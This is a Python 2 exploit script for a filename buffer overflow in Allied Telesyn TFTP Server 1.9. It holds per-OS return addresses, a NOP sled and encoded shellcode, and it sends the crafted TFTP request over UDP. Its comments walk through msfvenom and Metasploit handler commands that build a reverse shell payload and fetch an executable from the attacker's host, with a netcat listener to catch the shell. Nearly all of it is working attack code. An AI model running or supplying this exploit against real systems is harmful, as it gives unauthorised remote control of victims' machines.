#!/usr/bin/python2.7
# Standalone exploit for Allied Telesyn TFTP Server 1.9
# Written by daleksec 07/21/2016
# Special thanks to NetSec.ws for the excellent walk through (see http://netsec.ws/?p=262)

import sys, socket
 
if len(sys.argv)<=2:
 sys.exit('''Usage: python attftp_long_filename.py <IP Address> <Port> <Your IP Address> <OS choice>

 0	Windows NT SP4 English
 1	Windows 2000 SP0 English
 2	Windows 2000 SP1 English
 3	Windows 2000 SP2 English
 4	Windows 2000 SP3 English
 5	Windows 2000 SP4 English
 6	Windows XP SP0/1 English
 7	Windows XP SP2 English
 8	Windows XP SP3 English
 9	Windows Server 2003
 10	Windows Server 2003 SP2
 ''')
 
host	= sys.argv[1]		# Victim's IP
port	= int(sys.argv[2])	# Victim's Port
lhost	= sys.argv[3]		# Attacker's IP
os	= int(sys.argv[4])	# OS Choice
ret	= []			# Define array containing return addresses

# Define return addresses (Source: Metasploit)
ret = ["\xf7\xa6\x2e\x70",
	"\xc3\x62\x03\x75",
	"\x85\x1d\x03\x75",
	"\x1b\x43\x03\x75",
	"\x5a\x1c\xfe\x74",
	"\xce\x1d\x03\x75",
	"\xfb\x7b\xab\x71",
	"\x72\x93\xab\x71",
	"\x53\x93\x42\x7e",
	"\xd3\xfe\x86\x7c",
	"\x1b\xa0\x86\x7c"]

nop	= "\x90" * (25-len(lhost))	# Create a NOP string as to bring NOPs + LHOST up to 15 bytes
#Changed the above nops from 25 -> 15 based on following program in Ollydbg

# SKIDDIES BEWARE!
# You didn't think it'd be that easy did you?
# The payload must be customized to include your own IP address and listening port, so you'll need to generate it 
# yourself.  The LPORT is for the exploit/multi/handler to listen for the request to upload the file listed in   
# PEXEC. In this case, it is a windows/shell/reverse_tcp to 5150, so anc listener (nc -lvp 5150) running in a 
# separate window catches the shell.
#
# To run the exploit, run a exploit/multi/handler with the appropriate payload and PEXEC.  The handler listens
# on (in this case) 4444, or whatever port was used to generate the shellcode with msfvenom, the netcat listener
# listens on whichever port was specified when generating the .exe specified in PEXEC.
# To do so, use the following steps: 
#
# msfconsole: use exploit/multi/handler (matching payload, LHOST, LPORT, and PEXEC as specified in step 2 below)
# Terminal/bash: nc -lvp 5150
# Terminal/IDE: python2.7 atftp_upexec_revnonx4444.py 10.11.1.226 69 10.11.0.60 9
# 
# 1.) Enter the following to create a hex file of the amount that needs to be subtracted from the stack pointer (3500):
# perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
#
# 2.) Next, use the following command to create a staged meterpreter shell payload:
# msfvenom -p windows/upexec/reverse_nonx_tcp -a x86 --platform windows LHOST="10.11.0.60" LPORT="4444" PEXEC="/var/www/html/temp/5150winshellrev5150.exe" -f raw -o payload
#
# 3.) Then, combine the two files you just created.
# cat stackadj payload > shellcode
#
# 4.) Finally, let's eliminate the bad characters.
# cat shellcode | msfvenom -b '\x00' -e x86/shikata_ga_nai -f python
#
# Enter the output as the value of the "payload" variable.

# Payload (bad characters = \x00, stack adjustment = -3500, can't exceed 210 bytes of space)
buf =  b""
buf += b"\xbd\xc6\xcc\x05\xde\xdb\xd7\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x2e\x31\x6a\x15\x03\x6a\x15\x83\xea\xfc\xe2"
buf += b"\x33\x4d\xe9\x72\xb6\x4e\xf2\x76\xa2\xa5\xb5\x6e\xcb"
buf += b"\xc5\xc5\x90\x4b\x0b\xe1\xe4\xf6\x57\x9e\x87\x35\xd0"
buf += b"\xa1\x98\xce\x77\x82\x67\x3a\xfc\xf6\xfd\xbb\xed\xc6"
buf += b"\xc1\x22\x5d\xe9\x08\x59\x9f\x28\x08\xa1\xea\x5a\x52"
buf += b"\x47\x2c\x69\x20\x64\x05\xe6\x84\x4e\x9b\x11\x7c\x05"
buf += b"\x87\xb8\x0a\x56\xa4\x3b\xe4\x6b\xf8\xa2\x7f\x07\x24"
buf += b"\xc9\x1e\x28\xc4\xc0\x3b\xb2\x8e\x60\x8c\xb1\xd1\x6a"
buf += b"\x67\xb5\xcd\xdf\xfc\x5d\xe6\x41\x65\xce\x90\x15\x5a"
buf += b"\xc2\x34\x91\xef\x10\x9a\x09\x76\xed\x56\xd2\x89\xdb"
buf += b"\x02\x41\x25\xb0\x7f\x25\x9a\x75\xd3\x20\xfb\x1f\x52"
buf += b"\xdd\x0c\xdd\x03\x71\x6b\x58\x4c\xaa\x8c\x4c\xf5\xec"
buf += b"\xdb\x1f\x05\xd8\x8b\xb7\xf3\xee\xb3\x7b\x62\x99\xa2"
buf += b"\xdf\x0c\x0a\x4c\x3c\xba\xbc\x1d\x95\x5d\x04\xf6\x1c"
buf += b"\x5d\xa0\xa9\xaa\xad\x1d\x19\x85\xfe\xfb\x24\xe9\x39"
buf += b"\xfb\xb1"



# ...

exploit	= "\x00\x02" + nop + buf + ret[os] + "\x83\xc4\x28\xc3\x00netascii\x00" 	# Our exploit so far 

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	# Declare a UDP socket
client.sendto(exploit, (host, port))				# Send the exploit over UDP to the nominated addresses
